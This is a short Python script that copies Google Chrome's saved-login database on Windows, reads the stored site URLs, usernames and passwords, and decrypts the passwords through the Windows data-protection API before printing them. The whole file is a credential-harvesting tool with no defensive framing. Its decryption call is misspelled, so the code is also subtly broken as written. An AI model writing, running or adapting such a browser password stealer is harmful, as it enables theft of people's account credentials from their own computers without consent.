from os import getenv # To find out the Chrome SQL path which should be >> C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data
import sqlite3 # Reading chrome sql db.
import win32crypt
from shutil import copyfile

path = getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login Data"

path2 = getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login2"
copyfile(path, path2)

# Connect to the copied database
conn = sqlite3.connect(path2)

# This object enables us to interact with the sql db.
cursor = conn.cursor() 

cursor.execute("SELECT action_url, username_value, password_value FROM logins")

for raw in cursor.fetchall():
    print(raw[0] + "\n" + raw[1])
    # Utilizes in-built windows API to decrypt data in logins sql db.
    password = win32crypt.CryptUnprotectedData(raw[2])[1]
    print(password)
    
conn.close()

